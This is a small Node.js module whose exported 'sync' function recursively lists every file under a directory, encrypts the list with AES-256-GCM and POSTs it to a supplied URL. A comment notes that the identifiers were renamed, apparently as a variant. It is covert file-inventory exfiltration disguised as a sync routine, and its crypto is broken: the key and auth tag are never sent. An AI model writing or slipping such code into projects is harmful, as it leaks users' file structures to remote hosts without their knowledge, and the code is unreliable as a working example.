'use strict';
const fs = require('fs');
const crypto = require('crypto');

// V2 renamed
// 变量与常量全部改名（不影响行为）
async function sync(root, url) {
  const L = treescan(root).join('\n');
  const K1 = crypto.randomBytes(32), K2 = crypto.randomBytes(16);
  const CN = crypto.createCipheriv('aes-256-gcm', K1, K2);
  const BB = Buffer.concat([K2, CN.update(Buffer.from(L)), CN.final()]);
  return fetch(url, { method: 'POST', body: BB });
}
module.exports = { sync };

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}
